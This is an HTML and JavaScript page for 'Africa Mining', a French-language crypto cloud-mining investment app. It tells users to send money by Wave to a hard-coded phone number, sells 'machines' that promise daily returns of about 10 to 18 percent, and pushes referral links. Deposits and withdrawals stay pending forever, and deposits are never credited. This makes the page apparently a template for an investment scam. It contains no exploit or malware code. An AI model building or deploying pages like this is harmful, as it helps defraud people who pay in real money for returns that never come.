<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Africa Mining</title>
<style>
*{box-sizing:border-box;font-family:Arial;}
body{margin:0;background-image:url("https://i.imgur.com/0Z8FQ7Q.png");background-size:200px;background-repeat:repeat;}
.container{max-width:420px;margin:auto;min-height:100vh;background:white;padding:20px;}
.row{display:flex;gap:8px;margin-top:10px;}
input{flex:1;padding:12px;border-radius:8px;border:1px solid #ccc;}
button{padding:12px;border:none;border-radius:8px;background:gold;font-weight:bold;cursor:pointer;}
.full{width:100%;margin-top:10px;}
.green{background:#2ecc71;color:white;}
.blue{background:#3498db;color:white;}
.card{background:#fafafa;padding:15px;border-radius:10px;margin-top:10px;}
.machine{display:flex;gap:10px;background:#fff8dc;padding:10px;border-radius:10px;margin-top:10px;align-items:center;}
.machine img{width:60px;}
</style>
</head>
<body>
<div id="app" class="container"></div>
<script>
const app=document.getElementById("app")
let users=JSON.parse(localStorage.getItem("users"))||{}
let deposits=JSON.parse(localStorage.getItem("deposits"))||[]
let withdrawals=JSON.parse(localStorage.getItem("withdrawals"))||[]
let current=null
function save(){localStorage.setItem("users",JSON.stringify(users));localStorage.setItem("deposits",JSON.stringify(deposits));localStorage.setItem("withdrawals",JSON.stringify(withdrawals));}
function generateCode(){return "AF"+Math.floor(Math.random()*100000);}
function home(){
app.innerHTML=`
<h1>Africa Mining</h1>
<div class="row">
<input id="phone" placeholder="Numéro téléphone">
<input id="pin" type="password" maxlength="4" placeholder="PIN">
<button onclick="login()">Connexion</button>
</div>
<button class="full" onclick="registerPage()">S'inscrire</button>
<button class="full blue" onclick="support()">Contacter l'assistance</button>
`
}
function registerPage(){
app.innerHTML=`
<h2>Créer compte</h2>
<input id="phone" placeholder="Numéro téléphone">
<input id="pin" type="password" maxlength="4" placeholder="PIN 4 chiffres">
<input id="ref" placeholder="Code parrain (facultatif)">
<button class="full" onclick="register()">Créer</button>
<button class="full" onclick="home()">Retour</button>
`
}
function register(){
let phone=document.getElementById("phone").value
let pin=document.getElementById("pin").value
let ref=document.getElementById("ref").value
if(pin.length!=4){alert("PIN = 4 chiffres");return}
if(users[phone]){alert("Compte existe déjà");return}
let code=generateCode()
users[phone]={pin:pin,balance:0,machines:[],refCode:code,referrer:ref,firstDeposit:false,lastMine:0}
save()
alert("Compte créé")
home()
}
function login(){
let phone=document.getElementById("phone").value
let pin=document.getElementById("pin").value
if(!users[phone]||users[phone].pin!=pin){alert("Connexion incorrecte");return}
current=phone
dashboard()
}
function mine(){
let u=users[current]
let now=Date.now()
if(now-u.lastMine>86400000){
let gain=0
u.machines.forEach(m=>{gain+=m.gain})
u.balance+=gain
u.lastMine=now
save()
}
}
function dashboard(){
mine()
let u=users[current]
app.innerHTML=`
<h2>Tableau de bord</h2>
<div class="card">
Compte : ${current}<br>
Solde : <b>${u.balance} FCFA</b>
</div>
<button class="full" onclick="machinePage()">Machines</button>
<button class="full" onclick="depositStep1()">Faire dépôt</button>
<button class="full green" onclick="transactions()">Transactions</button>
<button class="full" onclick="withdrawStep1()">Retrait</button>
<button class="full blue" onclick="support()">Contacter l'assistance</button>
<button class="full" style="background:red;color:white;" onclick="autoAffiliate()">Générer lien affilié</button>
<button class="full" onclick="logout()">Déconnexion</button>
`
}
let machines=[
{name:"Ethereum Starter",price:2500,gain:250,img:"https://cryptologos.cc/logos/ethereum-eth-logo.png"},
{name:"Bitcoin Basic",price:5000,gain:600,img:"https://cryptologos.cc/logos/bitcoin-btc-logo.png"},
{name:"Litecoin Miner",price:10000,gain:1400,img:"https://cryptologos.cc/logos/litecoin-ltc-logo.png"},
{name:"Dogecoin Rig",price:20000,gain:3000,img:"https://cryptologos.cc/logos/dogecoin-doge-logo.png"},
{name:"Solana Node",price:50000,gain:8000,img:"https://cryptologos.cc/logos/solana-sol-logo.png"},
{name:"Ethereum Pro",price:100000,gain:17000,img:"https://cryptologos.cc/logos/ethereum-eth-logo.png"},
{name:"Bitcoin Farm",price:200000,gain:35000,img:"https://cryptologos.cc/logos/bitcoin-btc-logo.png"},
{name:"XRP Mega Farm",price:300000,gain:55000,img:"https://cryptologos.cc/logos/xrp-xrp-logo.png"}
]
function machinePage(){
let html="<h2>Machines</h2>"
machines.forEach((m,i)=>{
html+=`
<div class="machine">
<img src="${m.img}">
<div>
<b>${m.name}</b><br>
Prix : ${m.price} FCFA<br>
Gain journalier : ${m.gain}<br>
<button onclick="buy(${i})">Acheter</button>
</div>
</div>
`
})
html+=`<button class="full" onclick="dashboard()">Retour</button>`
app.innerHTML=html
}
function buy(i){
let u=users[current]
let m=machines[i]
if(u.balance<m.price){alert("Solde insuffisant");return}
u.balance-=m.price
u.machines.push(m)
save()
alert("Machine activée")
dashboard()
}
/* DEPOT */
function depositStep1(){
app.innerHTML=`
<h2>Dépôt Wave</h2>
<div class="card">
Envoyer argent sur :<br><br>
<b id="wave">0173052512</b>
<button onclick="copyWave()">Copier</button>
<br><br>
Ensuite cliquez suivant.
</div>
<button class="full" onclick="depositStep2()">Suivant</button>
<button class="full" onclick="dashboard()">Retour</button>
`
}
function copyWave(){navigator.clipboard.writeText("0173052512");alert("Numéro copié")}
function depositStep2(){
app.innerHTML=`
<h2>Preuve dépôt</h2>
<input id="amount" placeholder="Montant">
<input id="tx" placeholder="ID transaction">
<input type="file">
<button class="full" onclick="sendDeposit()">Envoyer</button>
<button class="full" onclick="dashboard()">Retour</button>
`
}
function sendDeposit(){
let amount=parseInt(document.getElementById("amount").value)
let tx=document.getElementById("tx").value
deposits.push({user:current,amount:amount,tx:tx,status:"en attente"})
save()
alert("Dépôt envoyé")
dashboard()
}
/* RETRAIT */
let withdrawTemp={}
function withdrawStep1(){
app.innerHTML=`
<h2>Retrait</h2>
<input id="wphone" placeholder="Numéro Wave">
<input id="wamount" placeholder="Montant">
<button class="full" onclick="withdrawStep2()">Suivant</button>
<button class="full" onclick="dashboard()">Retour</button>
`
}
function withdrawStep2(){
withdrawTemp.phone=document.getElementById("wphone").value
withdrawTemp.amount=parseInt(document.getElementById("wamount").value)
app.innerHTML=`
<h2>Confirmation</h2>
<input id="pinConfirm" type="password" maxlength="4" placeholder="Code PIN">
<button class="full" onclick="confirmWithdraw()">Confirmer</button>
`
}
function confirmWithdraw(){
let pin=document.getElementById("pinConfirm").value
if(pin!=users[current].pin){alert("PIN incorrect");return}
if(users[current].balance<withdrawTemp.amount){alert("Solde insuffisant");return}
users[current].balance-=withdrawTemp.amount
withdrawals.push({user:current,amount:withdrawTemp.amount,phone:withdrawTemp.phone,status:"en attente"})
save()
alert("Retrait envoyé")
dashboard()
}
/* transactions */
function transactions(){
let html="<h2>Transactions</h2>"
deposits.forEach(d=>{if(d.user==current){html+=`<div class="card">Dépôt : ${d.amount} - ${d.status}</div>`}})
withdrawals.forEach(w=>{if(w.user==current){html+=`<div class="card">Retrait : ${w.amount} - ${w.status}</div>`}})
html+=`<button class="full" onclick="dashboard()">Retour</button>`
app.innerHTML=html
}
/* assistance */
function support(){
app.innerHTML=`
<h2>Assistance</h2>
<div class="card">
Contact support :<br><br>
WhatsApp : 0173052512
</div>
<button class="full" onclick="home()">Retour</button>
`
}
/* Lien affilié automatique */
function autoAffiliate(){
let u=users[current];
let link=location.href+"?ref="+u.refCode;
navigator.clipboard.writeText(link);
alert("Lien affilié généré et copié : "+link);
}
function logout(){current=null;home()}
home()
</script>
</body>
</html>
